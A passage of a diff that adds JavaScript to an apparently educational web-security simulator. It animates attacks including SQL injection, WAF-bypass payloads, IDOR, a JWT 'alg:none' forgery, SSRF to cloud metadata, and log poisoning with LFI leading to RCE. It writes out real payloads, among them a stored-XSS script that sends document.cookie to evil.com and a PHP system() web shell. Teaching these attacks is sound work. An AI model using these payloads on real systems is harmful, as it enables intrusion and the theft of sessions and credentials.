+            }
+
+            clearSimTimeouts('sim1');
+            const pkt = document.getElementById('pkt1');
+            const burp = document.getElementById('n1-burp');
+            const server = document.getElementById('n1-server');
+
+            pkt.style.left = '94%';
+            playSound('whoosh');
+
+            addSimTimeout('sim1', () => {
+                server.classList.add('success-node');
+                burp.classList.remove('danger-node');
+                document.getElementById('st1-burp').innerText = 'Forwarded';
+                document.getElementById('st1-burp').style.color = '#10b981';
+
+                const val = document.getElementById('burpInputPayload').value;
+                const isZeroPrice = val.includes('"price": 0') || val.includes('"price":0') || val.includes('price=0');
+                if (isZeroPrice) {
+                    playSound('success');
+                    appendLog('term1', '🎉 HTTP/1.1 200 OK | {"status": "success", "invoice_total": 0} (Business Logic Flaw Expose)', 'ok');
+                } else {
+                    playSound('beep');
+                    appendLog('term1', 'HTTP/1.1 200 OK | Transaction completed with forwarded payload.', 'normal');
+                }
+                addSimTimeout('sim1', () => { pkt.style.opacity = '0'; }, 600);
+                burpHeld = false;
+            }, 750);
+        }
+
+        // =================================================================
+        // SIM 2: FFUF Packet Storm
+        // =================================================================
+        function runFfufStorm() {
+            clearSimTimeouts('sim2');
+            const pkt = document.getElementById('pkt2');
+            const ffuf = document.getElementById('n2-ffuf');
+            const admin = document.getElementById('n2-admin');
+            const backup = document.getElementById('n2-backup');
+            const api = document.getElementById('n2-api');
+
+            [admin, backup, api].forEach(n => {
+                n.className = 'station-node';
+            });
+            document.getElementById('st2-admin').innerText = 'Status: ---';
+            document.getElementById('st2-backup').innerText = 'Status: ---';
+            document.getElementById('st2-api').innerText = 'Status: ---';
+            document.getElementById('st2-admin').style.color = '';
+            document.getElementById('st2-backup').style.color = '';
+            document.getElementById('st2-api').style.color = '';
+
+            ffuf.classList.add('active-node');
+            appendLog('term2', '$ ffuf -u http://target.lab/FUZZ -w common.txt -mc 200,403', 'warn');
+
+            // Probe 1: Starts at Attacker FFUF (6%) -> /admin (36%)
+            spawnAtAttacker('pkt2', '⚡ Probe: /admin', false);
+            playSound('whoosh');
+            addSimTimeout('sim2', () => {
+                pkt.style.left = '36%';
+                admin.classList.add('active-node');
+                document.getElementById('st2-admin').innerText = '403 Forbidden';
+                document.getElementById('st2-admin').style.color = '#f59e0b';
+                playSound('beep');
+                appendLog('term2', '[Status: 403, Size: 284] :: /admin', 'warn');
+            }, 300);
+
+            // Probe 2: Reloads at Attacker FFUF (6%) -> /backup.sql (65%)
+            addSimTimeout('sim2', () => {
+                spawnAtAttacker('pkt2', '⚡ Probe: /backup.sql', true);
+                playSound('whoosh');
+            }, 900);
+
+            addSimTimeout('sim2', () => {
+                pkt.style.left = '65%';
+                backup.classList.add('danger-node');
+                document.getElementById('st2-backup').innerText = '200 OK (52MB)';
+                document.getElementById('st2-backup').style.color = '#10b981';
+                playSound('success');
+                appendLog('term2', '🎯 [FOUND] [Status: 200, Size: 54528192] :: /backup.sql', 'ok');
+            }, 1200);
+
+            // Probe 3: Reloads at Attacker FFUF (6%) -> /api/v2/docs (94%)
+            addSimTimeout('sim2', () => {
+                spawnAtAttacker('pkt2', '⚡ Probe: /api/v2/docs', false);
+                playSound('whoosh');
+            }, 1800);
+
+            addSimTimeout('sim2', () => {
+                pkt.style.left = '94%';
+                api.classList.add('success-node');
+                document.getElementById('st2-api').innerText = '200 OK';
+                document.getElementById('st2-api').style.color = '#10b981';
+                playSound('beep');
+                appendLog('term2', '✨ [FOUND] [Status: 200, Size: 1820] :: /api/v2/docs (Swagger UI Exposed)', 'ok');
+            }, 2100);
+
+            addSimTimeout('sim2', () => {
+                pkt.style.opacity = '0';
+            }, 2800);
+        }
+
+        function runGoogleDorkDemo() {
+            playSound('beep');
+            appendLog('term2', '$ Google Dork: site:target.com ext:log | inurl:config', 'normal');
+            setTimeout(() => {
+                playSound('danger');
+                appendLog('term2', '⚠️ Found exposed public log: https://target.com/logs/laravel.log containing APP_KEY & DB_PASSWORD!', 'err');
+            }, 450);
+        }
+
+        function runFfufEnvProbe() {
+            clearSimTimeouts('sim2');
+            playSound('beep');
+            spawnAtAttacker('pkt2', '⚡ Probe: /.env', true);
+            appendLog('term2', '$ ffuf -u http://target.lab/FUZZ -w sensitive_files.txt -mc 200', 'warn');
+            addSimTimeout('sim2', () => {
+                const pkt = document.getElementById('pkt2');
+                pkt.style.left = '65%';
+                playSound('danger');
+                appendLog('term2', '🔥 [CRITICAL LEAK] 200 OK :: /.env -> DB_PASSWORD=SecretRoot123! APP_KEY=base64:XyZ...', 'err');
+                addSimTimeout('sim2', () => { pkt.style.opacity = '0'; }, 900);
+            }, 400);
+        }
+
+        // =================================================================
+        // SIM 3: WAF Filter Inspection
+        // =================================================================
+        function testWafPacket(mode) {
+            clearSimTimeouts('sim3');
+            const pkt = document.getElementById('pkt3');
+            const client = document.getElementById('n3-client');
+            const waf = document.getElementById('n3-waf');
+            const server = document.getElementById('n3-server');
+
+            [client, waf, server].forEach(n => n.className = 'station-node');
+            client.classList.add('active-node');
+            document.getElementById('st3-waf').innerText = 'Inspecting';
+            document.getElementById('st3-waf').style.color = '';
+
+            if (mode === 1) {
+                document.getElementById('wafPayloadInput').value = "SELECT * FROM users WHERE admin = 1";
+                spawnAtAttacker('pkt3', '💉 SELECT * FROM users', true);
+                playSound('beep');
+
+                addSimTimeout('sim3', () => {
+                    pkt.style.left = '50%';
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim3', () => {
+                    pkt.className = 'travel-packet blocked-packet';
+                    pkt.innerText = '🚫 403 BLOCKED BY WAF';
+                    waf.classList.add('danger-node');
+                    document.getElementById('st3-waf').innerText = '403 Blocked';
+                    document.getElementById('st3-waf').style.color = '#ef4444';
+                    playSound('danger');
+                    appendLog('term3', '🚨 [WAF DROP 403 Forbidden] Rule 942100: SQL Injection Keyword Detected (SELECT * FROM)', 'err');
+                    addSimTimeout('sim3', () => { pkt.style.opacity = '0'; }, 900);
+                }, 1050);
+
+            } else if (mode === 2) {
+                document.getElementById('wafPayloadInput').value = "SELECT/**/password/**/FROM/**/users";
+                spawnAtAttacker('pkt3', '🥷 SELECT/**/password/**/FROM', true);
+                playSound('beep');
+
+                addSimTimeout('sim3', () => {
+                    pkt.style.left = '50%';
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim3', () => {
+                    waf.classList.add('active-node');
+                    document.getElementById('st3-waf').innerText = 'Passed (Bypassed)';
+                    document.getElementById('st3-waf').style.color = '#10b981';
+                }, 1050);
+
+                addSimTimeout('sim3', () => {
+                    pkt.style.left = '94%';
+                    playSound('whoosh');
+                }, 1150);
+
+                addSimTimeout('sim3', () => {
+                    server.classList.add('danger-node');
+                    playSound('success');
+                    appendLog('term3', '✅ [WAF BYPASS] Inline comment /*...*/ successfully bypassed naive whitespace tokenizer.', 'ok');
+                    addSimTimeout('sim3', () => { pkt.style.opacity = '0'; }, 900);
+                }, 1900);
+
+            } else if (mode === 3) {
+                document.getElementById('wafPayloadInput').value = "sElEcT%20password%20FrOm%20users";
+                spawnAtAttacker('pkt3', '🧙 sElEcT%20password', true);
+                playSound('beep');
+
+                addSimTimeout('sim3', () => {
+                    pkt.style.left = '50%';
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim3', () => {
+                    waf.classList.add('active-node');
+                    document.getElementById('st3-waf').innerText = 'Passed (Bypassed)';
+                    document.getElementById('st3-waf').style.color = '#10b981';
+                }, 1050);
+
+                addSimTimeout('sim3', () => {
+                    pkt.style.left = '94%';
+                    playSound('whoosh');
+                }, 1150);
+
+                addSimTimeout('sim3', () => {
+                    server.classList.add('danger-node');
+                    playSound('success');
+                    appendLog('term3', '✨ [WAF BYPASS] Mixed-case + URL encoding passed inspection filters cleanly.', 'ok');
+                    addSimTimeout('sim3', () => { pkt.style.opacity = '0'; }, 900);
+                }, 1900);
+            }
+        }
+
+        function testCustomWaf() {
+            clearSimTimeouts('sim3');
+            const val = document.getElementById('wafPayloadInput').value.trim();
+            const pkt = document.getElementById('pkt3');
+            const client = document.getElementById('n3-client');
+            const waf = document.getElementById('n3-waf');
+            const server = document.getElementById('n3-server');
+
+            [client, waf, server].forEach(n => n.className = 'station-node');
+            client.classList.add('active-node');
+
+            const hasInlineComment = val.includes('/**/');
+            const hasUrlEncode = val.includes('%20') || val.includes('%27') || val.includes('%23');
+            const hasRawSqli = /\bselect\b\s+.*\bfrom\b/i.test(val) || /'\s*or\s*'/i.test(val) || /\bunion\b\s+\bselect\b/i.test(val);
+
+            spawnAtAttacker('pkt3', val.length > 25 ? val.slice(0, 25) + '...' : val, hasRawSqli || hasInlineComment || hasUrlEncode);
+            playSound('beep');
+
+            addSimTimeout('sim3', () => {
+                pkt.style.left = '50%';
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('sim3', () => {
+                if (hasInlineComment || hasUrlEncode) {
+                    waf.classList.add('active-node');
+                    document.getElementById('st3-waf').innerText = 'Passed (Bypassed)';
+                    document.getElementById('st3-waf').style.color = '#10b981';
+                    addSimTimeout('sim3', () => {
+                        pkt.style.left = '94%';
+                        playSound('whoosh');
+                    }, 200);
+                    addSimTimeout('sim3', () => {
+                        server.classList.add('danger-node');
+                        playSound('success');
+                        appendLog('term3', `✅ [WAF BYPASS SUCCESS] Payload "${val}" passed WAF signature filter!`, 'ok');
+                        addSimTimeout('sim3', () => { pkt.style.opacity = '0'; }, 800);
+                    }, 800);
+                } else if (hasRawSqli) {
+                    pkt.className = 'travel-packet blocked-packet';
+                    pkt.innerText = '🚫 403 BLOCKED BY WAF';
+                    waf.classList.add('danger-node');
+                    document.getElementById('st3-waf').innerText = '403 Blocked';
+                    document.getElementById('st3-waf').style.color = '#ef4444';
+                    playSound('danger');
+                    appendLog('term3', `🚨 [WAF DROP 403] Detected malicious SQL syntax in payload: "${val}"`, 'err');
+                    addSimTimeout('sim3', () => { pkt.style.opacity = '0'; }, 900);
+                } else {
+                    waf.classList.add('success-node');
+                    document.getElementById('st3-waf').innerText = 'Passed (Clean)';
+                    document.getElementById('st3-waf').style.color = '#10b981';
+                    addSimTimeout('sim3', () => {
+                        pkt.style.left = '94%';
+                        playSound('whoosh');
+                    }, 200);
+                    addSimTimeout('sim3', () => {
+                        server.classList.add('success-node');
+                        playSound('success');
+                        appendLog('term3', `HTTP 200 OK | Normal request passed inspection: "${val}"`, 'ok');
+                        addSimTimeout('sim3', () => { pkt.style.opacity = '0'; }, 800);
+                    }, 800);
+                }
+            }, 1050);
+        }
+
+        // =================================================================
+        // SIM 4: Injection Execution
+        // =================================================================
+        function runSqliPacket(mode) {
+            clearSimTimeouts('sim4');
+            const pkt = document.getElementById('pkt4');
+            const client = document.getElementById('n4-client');
+            const server = document.getElementById('n4-server');
+            const db = document.getElementById('n4-db');
+
+            [client, server, db].forEach(n => n.className = 'station-node');
+            client.classList.add('active-node');
+            document.getElementById('st4-db').innerText = 'Status: OK';
+            document.getElementById('st4-db').style.color = '';
+
+            if (mode === 1) {
+                document.getElementById('sqliInputParam').value = "1";
+                spawnAtAttacker('pkt4', '📄 GET /item?id=1', false);
+                playSound('beep');
+
+                addSimTimeout('sim4', () => {
+                    pkt.style.left = '50%';
+                    server.classList.add('active-node');
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim4', () => {
+                    pkt.style.left = '94%';
+                    playSound('whoosh');
+                }, 1050);
+
+                addSimTimeout('sim4', () => {
+                    db.classList.add('success-node');
+                    playSound('success');
+                    appendLog('term4', 'SQL: SELECT id, title, price FROM products WHERE id = 1;', 'normal');
+                    appendLog('term4', 'Response: [{"id": 1, "title": "Wireless Mouse", "price": 450}]', 'ok');
+                    pkt.style.opacity = '0';
+                }, 1800);
+
+            } else if (mode === 2) {
+                document.getElementById('sqliInputParam').value = "1' UNION SELECT 1,username,password FROM users--";
+                spawnAtAttacker('pkt4', '💥 1\' UNION SELECT 1,username,password', true);
+                playSound('beep');
+
+                addSimTimeout('sim4', () => {
+                    pkt.style.left = '50%';
+                    server.classList.add('danger-node');
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim4', () => {
+                    pkt.style.left = '94%';
+                    playSound('whoosh');
+                }, 1050);
+
+                addSimTimeout('sim4', () => {
+                    db.classList.add('danger-node');
+                    playSound('danger');
+                    appendLog('term4', "SQL: SELECT id, title, price FROM products WHERE id = '1' UNION SELECT 1,username,password FROM users--';", 'err');
+                    appendLog('term4', "💥 UNION Data Exfiltration: [admin:$2y$10$H8z/9s2..., alice:pass123, root:toor]", 'err');
+                    pkt.style.opacity = '0';
+                }, 1800);
+
+            } else if (mode === 3) {
+                document.getElementById('sqliInputParam').value = "1' AND (SELECT SLEEP(3))--";
+                spawnAtAttacker('pkt4', '⏱️ 1\' AND (SELECT SLEEP(3))--', true);
+                playSound('beep');
+
+                addSimTimeout('sim4', () => {
+                    pkt.style.left = '50%';
+                    server.classList.add('active-node');
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim4', () => {
+                    pkt.style.left = '94%';
+                    playSound('whoosh');
+                }, 1050);
+
+                addSimTimeout('sim4', () => {
+                    db.classList.add('active-node');
+                    document.getElementById('st4-db').innerText = 'Sleeping 3s...';
+                    document.getElementById('st4-db').style.color = '#f59e0b';
+                    appendLog('term4', "SQL: SELECT ... WHERE id = '1' AND (SELECT SLEEP(3))--;", 'warn');
+                    appendLog('term4', "⏳ Database paused execution for 3000ms. Response delayed confirming Time-Based Blind SQLi.", 'warn');
+                    
+                    addSimTimeout('sim4', () => { document.getElementById('st4-db').innerText = 'Sleeping 2s...'; playSound('beep'); }, 1000);
+                    addSimTimeout('sim4', () => { document.getElementById('st4-db').innerText = 'Sleeping 1s...'; playSound('beep'); }, 2000);
+                }, 1800);
+
+                addSimTimeout('sim4', () => {
+                    playSound('success');
+                    db.classList.remove('active-node');
+                    db.classList.add('success-node');
+                    document.getElementById('st4-db').innerText = 'Awake (3.02s)';
+                    document.getElementById('st4-db').style.color = '#10b981';
+                    appendLog('term4', "⏰ Response arrived after 3.02s.", 'ok');
+                    pkt.style.opacity = '0';
+                }, 4800);
+            }
+        }
+
+        function runCustomSqli() {
+            const val = document.getElementById('sqliInputParam').value.trim();
+            if (val.includes('SLEEP')) {
+                runSqliPacket(3);
+            } else if (val.includes('UNION') || val.includes('OR 1=1')) {
+                runSqliPacket(2);
+            } else {
+                runSqliPacket(1);
+            }
+        }
+
+        // =================================================================
+        // SIM 4b: XSS
+        // =================================================================
+        function runXssPacket(mode) {
+            clearSimTimeouts('simxss');
+            const pkt = document.getElementById('pktxss');
+            const client = document.getElementById('nxss-client');
+            const server = document.getElementById('nxss-server');
+            const victim = document.getElementById('nxss-victim');
+            const stServer = document.getElementById('stxss-server');
+            const stVictim = document.getElementById('stxss-victim');
+
+            [client, server, victim].forEach(n => n.className = 'station-node');
+            client.classList.add('active-node');
+            stVictim.style.color = '';
+
+            if (mode === 1) {
+                spawnAtAttacker('pktxss', '💬 Comment: "Nice post!"', false);
+                playSound('beep');
+
+                addSimTimeout('simxss', () => {
+                    pkt.style.left = '50%';
+                    server.classList.add('active-node');
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('simxss', () => {
+                    appendLog('termxss', 'Server stores comment as plain text: "Nice post!"', 'normal');
+                    stServer.innerText = 'Stored: 1 comment';
+                }, 900);
+
+                addSimTimeout('simxss', () => {
+                    pkt.style.left = '94%';
+                    victim.classList.add('success-node');
+                    playSound('success');
+                    appendLog('termxss', 'Victim views page: comment rendered as harmless text.', 'ok');
+                    stVictim.innerText = 'Status: Safe';
+                    pkt.style.opacity = '0';
+                }, 1700);
+
+            } else if (mode === 2) {
+                // ESCAPED TO PREVENT HTML PARSER EARLY TERMINATION
+                spawnAtAttacker('pktxss', "🧬 <script>fetch('evil.com?c='+document.cookie)<\/script>", true);
+                playSound('beep');
+
+                addSimTimeout('simxss', () => {
+                    pkt.style.left = '50%';
+                    server.classList.add('danger-node');
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('simxss', () => {
+                    appendLog('termxss', "Server saves comment WITHOUT sanitising or encoding it (stored verbatim in DB).", 'err');
+                    stServer.innerText = 'Stored: 1 comment (unsanitised!)';
+                }, 900);
+
+                addSimTimeout('simxss', () => {
+                    pkt.style.left = '94%';
+                    victim.classList.add('danger-node');
+                    playSound('danger');
+                    appendLog('termxss', "Victim opens the page → browser renders the script tag and RUNS it.", 'err');
+                    appendLog('termxss', "💥 document.cookie exfiltrated to attacker's server: 'session=a1b2c3...'", 'err');
+                    stVictim.innerText = 'Cookie: STOLEN';
+                    stVictim.style.color = '#ef4444';
+                    pkt.style.opacity = '0';
+                }, 1700);
+
+            } else if (mode === 3) {
+                spawnAtAttacker('pktxss', "🔗 GET /search?q=<script>alert(document.cookie)<\/script>", true);
+                playSound('beep');
+
+                addSimTimeout('simxss', () => {
+                    pkt.style.left = '50%';
+                    server.classList.add('active-node');
+                    playSound('whoosh');
+                    appendLog('termxss', "Server does NOT store this — it just reflects the search term back into the HTML response.", 'warn');
+                }, 300);
+
+                addSimTimeout('simxss', () => {
+                    pkt.style.left = '94%';
+                    victim.classList.add('danger-node');
+                    playSound('danger');
+                    appendLog('termxss', "Victim had to click the crafted link first — then the reflected script executes once, only for them.", 'err');
+                    stVictim.innerText = 'Cookie: exposed (1x)';
+                    stVictim.style.color = '#f59e0b';
+                    pkt.style.opacity = '0';
+                }, 1700);
+            }
+        }
+
+        function submitCustomXss() {
+            const input = document.getElementById('xssInputComment');
+            const val = input.value.trim();
+            if (!val) {
+                appendLog('termxss', '⚠️ กรุณาพิมพ์ข้อความหรือ Script ที่ต้องการส่งลงในกล่องความคิดเห็น', 'warn');
+                return;
+            }
+            clearSimTimeouts('simxss');
+            const isXss = /<script|onerror|onload|javascript:/i.test(val);
+            const pkt = document.getElementById('pktxss');
+            const client = document.getElementById('nxss-client');
+            const server = document.getElementById('nxss-server');
+            const victim = document.getElementById('nxss-victim');
+            const stServer = document.getElementById('stxss-server');
+            const stVictim = document.getElementById('stxss-victim');
+
+            [client, server, victim].forEach(n => n.className = 'station-node');
+            client.classList.add(isXss ? 'danger-node' : 'active-node');
+
+            spawnAtAttacker('pktxss', val.length > 25 ? val.slice(0, 25) + '...' : val, isXss);
+            playSound('beep');
+
+            addSimTimeout('simxss', () => {
+                pkt.style.left = '50%';
+                server.classList.add(isXss ? 'danger-node' : 'active-node');
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('simxss', () => {
+                stServer.innerText = isXss ? 'Stored: Unsanitised!' : 'Stored: Safe text';
+                appendLog('termxss', `Comment received: "${val}"`, isXss ? 'warn' : 'normal');
+            }, 900);
+
+            addSimTimeout('simxss', () => {
+                pkt.style.left = '94%';
+                if (isXss) {
+                    victim.classList.add('danger-node');
+                    playSound('danger');
+                    stVictim.innerText = 'Cookie: STOLEN';
+                    stVictim.style.color = '#ef4444';
+                    appendLog('termxss', `💥 [XSS EXECUTION] Injected code executed in victim browser! Cookie exfiltrated: "PHPSESSID=live_token_77a"`, 'err');
+                } else {
+                    victim.classList.add('success-node');
+                    playSound('success');
+                    stVictim.innerText = 'Status: Safe';
+                    stVictim.style.color = '#10b981';
+                    appendLog('termxss', `Victim rendered harmless text cleanly: "${val}"`, 'ok');
+                }
+                addSimTimeout('simxss', () => { pkt.style.opacity = '0'; }, 800);
+            }, 1700);
+        }
+
+        // =================================================================
+        // SIM 5: IDOR & JWT
+        // =================================================================
+        function testIdorPacket(id) {
+            clearSimTimeouts('sim5');
+            const pkt = document.getElementById('pkt5');
+            const client = document.getElementById('n5-client');
+            const server = document.getElementById('n5-server');
+            const vault = document.getElementById('n5-vault');
+
+            [client, server, vault].forEach(n => n.className = 'station-node');
+            client.classList.add(id === 1 ? 'danger-node' : 'active-node');
+            document.getElementById('idorInputId').value = id;
+
+            spawnAtAttacker('pkt5', `👤 GET /profile?id=${id}`, id === 1);
+            playSound('beep');
+
+            addSimTimeout('sim5', () => {
+                pkt.style.left = '50%';
+                server.classList.add(id === 1 ? 'danger-node' : 'active-node');
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('sim5', () => {
+                pkt.style.left = '94%';
+                playSound('whoosh');
+            }, 1050);
+
+            addSimTimeout('sim5', () => {
+                if (id === 105) {
+                    playSound('beep');
+                    appendLog('term5', 'GET /api/v1/profile?id=105 ➔ 200 OK | {"id": 105, "role": "Student", "balance": 150}', 'normal');
+                } else if (id === 1) {
+                    vault.classList.add('danger-node');
+                    playSound('danger');
+                    appendLog('term5', '🚨 [IDOR DETECTED] GET /api/v1/profile?id=1 ➔ 200 OK | {"id": 1, "role": "SuperAdmin", "balance": 10000000, "api_secret": "sec_key_99x"}', 'err');
+                } else {
+                    vault.classList.add('active-node');
+                    playSound('success');
+                    appendLog('term5', `📜 [IDOR] GET /api/v1/profile?id=${id} ➔ 200 OK | Unauthorized access to user account ${id} succeeded!`, 'ok');
+                }
+                addSimTimeout('sim5', () => { pkt.style.opacity = '0'; }, 900);
+            }, 1800);
+        }
+
+        function testCustomIdor() {
+            const idVal = parseInt(document.getElementById('idorInputId').value, 10);
+            if (isNaN(idVal)) {
+                appendLog('term5', '⚠️ กรุณาระบุตัวเลข User ID', 'warn');
+                return;
+            }
+            testIdorPacket(idVal);
+        }
+
+        function runJwtPacket() {
+            clearSimTimeouts('sim5');
+            const pkt = document.getElementById('pkt5');
+            const client = document.getElementById('n5-client');
+            const server = document.getElementById('n5-server');
+            const vault = document.getElementById('n5-vault');
+
+            [client, server, vault].forEach(n => n.className = 'station-node');
+            client.classList.add('danger-node');
+
+            spawnAtAttacker('pkt5', '🔏 JWT: {"alg":"none","role":"admin"}', true);
+            playSound('beep');
+            appendLog('term5', '🔑 [JWT Forge] Modified Header to {"alg":"none"} and Body to {"role":"admin"}. Signature stripped.', 'warn');
+
+            addSimTimeout('sim5', () => {
+                pkt.style.left = '50%';
+                server.classList.add('danger-node');
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('sim5', () => {
+                pkt.style.left = '94%';
+                playSound('whoosh');
+            }, 1050);
+
+            addSimTimeout('sim5', () => {
+                vault.classList.add('danger-node');
+                playSound('danger');
+                appendLog('term5', '🚨 [JWT AUTH BYPASS] Server accepted "alg":"none" without secret verification! Logged in as SuperAdmin!', 'err');
+                appendLog('term5', '👑 SuperAdmin Vault unlocked | Access Token valid for all endpoints.', 'ok');
+                addSimTimeout('sim5', () => { pkt.style.opacity = '0'; }, 900);
+            }, 1800);
+        }
+
+        // =================================================================
+        // SIM 6: SSRF
+        // =================================================================
+        function runSsrfPacket(isExploit) {
+            clearSimTimeouts('sim6');
+            const pkt = document.getElementById('pkt6');
+            const client = document.getElementById('n6-attacker');
+            const server = document.getElementById('n6-server');
+            const cloud = document.getElementById('n6-cloud');
+
+            [client, server, cloud].forEach(n => n.className = 'station-node');
+            client.classList.add(isExploit ? 'danger-node' : 'active-node');
+            document.getElementById('ssrfInputUrl').value = isExploit ? 'http://169.254.169.254/latest/meta-data/' : 'https://cdn.site/logo.png';
+
+            spawnAtAttacker('pkt6', isExploit ? '🔥 url=http://169.254.169.254/' : '🖼️ url=https://cdn.site/logo.png', isExploit);
+            playSound('beep');
+
+            addSimTimeout('sim6', () => {
+                pkt.style.left = '50%';
+                server.classList.add(isExploit ? 'danger-node' : 'active-node');
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('sim6', () => {
+                pkt.innerText = isExploit ? '📡 cURL ➔ 169.254.169.254' : '📡 cURL ➔ CDN Image';
+                pkt.style.left = '94%';
+                playSound('whoosh');
+            }, 1100);
+
+            addSimTimeout('sim6', () => {
+                if (isExploit) {
+                    cloud.classList.add('danger-node');
+                    document.getElementById('st6-cloud').innerText = 'PWNED!';
+                    document.getElementById('st6-cloud').style.color = '#ef4444';
+                    playSound('danger');
+                    appendLog('term6', '🔥 [SSRF SUCCESS] Internal Metadata Fetched: {"AccessKeyId": "AKIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}', 'err');
+                } else {
+                    cloud.classList.add('success-node');
+                    document.getElementById('st6-cloud').innerText = 'Fetched';
+                    document.getElementById('st6-cloud').style.color = '#10b981';
+                    playSound('success');
+                    appendLog('term6', 'HTTP 200 OK | Image resource fetched from external CDN.', 'ok');
+                }
+                addSimTimeout('sim6', () => { pkt.style.opacity = '0'; }, 900);
+            }, 1850);
+        }
+
+        function testCustomSsrf(customUrl) {
+            clearSimTimeouts('sim6');
+            const url = customUrl || document.getElementById('ssrfInputUrl').value.trim();
+            document.getElementById('ssrfInputUrl').value = url;
+
+            const isMeta = url.includes('169.254.169.254');
+            const isLocal = url.includes('localhost') || url.includes('127.0.0.1');
+            const isExploit = isMeta || isLocal;
+
+            const pkt = document.getElementById('pkt6');
+            const client = document.getElementById('n6-attacker');
+            const server = document.getElementById('n6-server');
+            const cloud = document.getElementById('n6-cloud');
+
+            [client, server, cloud].forEach(n => n.className = 'station-node');
+            client.classList.add(isExploit ? 'danger-node' : 'active-node');
+
+            spawnAtAttacker('pkt6', `📡 url=${url.slice(0, 20)}...`, isExploit);
+            playSound('beep');
+
+            addSimTimeout('sim6', () => {
+                pkt.style.left = '50%';
+                server.classList.add(isExploit ? 'danger-node' : 'active-node');
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('sim6', () => {
+                pkt.innerText = `cURL ➔ ${url.slice(0, 18)}...`;
+                pkt.style.left = '94%';
+                playSound('whoosh');
+            }, 1100);
+
+            addSimTimeout('sim6', () => {
+                if (isMeta) {
+                    cloud.classList.add('danger-node');
+                    document.getElementById('st6-cloud').innerText = 'PWNED (Cloud)';
+                    document.getElementById('st6-cloud').style.color = '#ef4444';
+                    playSound('danger');
+                    appendLog('term6', `🔥 [SSRF EXPLOIT] Cloud IAM Metadata Dumped from ${url}! AWS_SECRET_ACCESS_KEY exposed.`, 'err');
+                } else if (isLocal) {
+                    cloud.classList.add('danger-node');
+                    document.getElementById('st6-cloud').innerText = 'Internal Access';
+                    document.getElementById('st6-cloud').style.color = '#ef4444';
+                    playSound('danger');
+                    appendLog('term6', `🚨 [SSRF INTRANET BYPASS] Connected to internal loopback service at ${url}! Unauthorized private panel leaked.`, 'err');
+                } else {
+                    cloud.classList.add('success-node');
+                    document.getElementById('st6-cloud').innerText = 'Fetched 200';
+                    document.getElementById('st6-cloud').style.color = '#10b981';
+                    playSound('success');
+                    appendLog('term6', `HTTP 200 OK | External resource fetched cleanly: ${url}`, 'ok');
+                }
+                addSimTimeout('sim6', () => { pkt.style.opacity = '0'; }, 900);
+            }, 1850);
+        }
+
+        // =================================================================
+        // SIM 7: Chained Attack Flow
+        // =================================================================
+        let isLogPoisoned = false;
+        function runComboPacket(step) {
+            clearSimTimeouts('sim7');
+            const pkt = document.getElementById('pkt7');
+            const client = document.getElementById('n7-attacker');
+            const logNode = document.getElementById('n7-log');
+            const srvNode = document.getElementById('n7-server');
+            const cmd = (document.getElementById('comboInputCmd').value.trim()) || 'whoami';
+
+            client.classList.add('danger-node');
+
+            if (step === 1) {
+                spawnAtAttacker('pkt7', '🧪 User-Agent: <?php system($_GET["cmd"]); ?>', true);
+                playSound('beep');
+
+                addSimTimeout('sim7', () => {
+                    pkt.style.left = '50%';
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim7', () => {
+                    logNode.classList.add('danger-node');
+                    document.getElementById('st7-log').innerText = 'Poisoned with Shell';
+                    document.getElementById('st7-log').style.color = '#ef4444';
+                    playSound('beep');
+                    appendLog('term7', '📒 [Step 1: Poisoning] Sent HTTP Request with User-Agent: <?php system($_GET["cmd"]); ?> ➔ Written into access.log', 'warn');
+                    isLogPoisoned = true;
+                    addSimTimeout('sim7', () => { pkt.style.opacity = '0'; }, 800);
+                }, 1050);
+
+            } else if (step === 2) {
+                spawnAtAttacker('pkt7', `💥 LFI: ?page=access.log&cmd=${cmd}`, true);
+                playSound('beep');
+
+                addSimTimeout('sim7', () => {
+                    pkt.style.left = '94%';
+                    playSound('whoosh');
+                }, 300);
+
+                addSimTimeout('sim7', () => {
+                    if (!isLogPoisoned) {
+                        srvNode.classList.add('active-node');
+                        document.getElementById('st7-server').innerText = 'Log clean (No RCE)';
+                        document.getElementById('st7-server').style.color = '#f59e0b';
+                        playSound('beep');
+                        appendLog('term7', `⚠️ [LFI Triggered] GET /index.php?page=access.log&cmd=${cmd}`, 'warn');
+                        appendLog('term7', '⚠️ ไม่พบ PHP Code ในไฟล์ access.log! กรุณากดปุ่ม Step 1 เพื่อฉีด PHP Shell ก่อน!', 'warn');
+                    } else {
+                        srvNode.classList.add('danger-node');
+                        document.getElementById('st7-server').innerText = 'RCE ROOT SHELL';
+                        document.getElementById('st7-server').style.color = '#10b981';
+                        playSound('danger');
+                        appendLog('term7', `💥 [Step 2: LFI Execution] Triggered: GET /index.php?page=/var/log/apache2/access.log&cmd=${cmd}`, 'err');
+                        let fakeOutput = 'uid=0(root) gid=0(root) groups=0(root)';
+                        if (cmd === 'id') fakeOutput = 'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)';
+                        if (cmd.includes('passwd')) fakeOutput = 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin';
+                        if (cmd.includes('uname')) fakeOutput = 'Linux target-srv 5.15.0-generic #1 SMP x86_64 GNU/Linux';
+                        appendLog('term7', `👑 [RCE SUCCESS] Command output: "${fakeOutput}" ➔ Remote Shell Captured!`, 'ok');
+                    }
+                    addSimTimeout('sim7', () => { pkt.style.opacity = '0'; }, 800);
+                }, 1100);
+            }
+        }
+
+        function runComboReset() {
+            clearSimTimeouts('sim7');
+            isLogPoisoned = false;
+            const client = document.getElementById('n7-attacker');
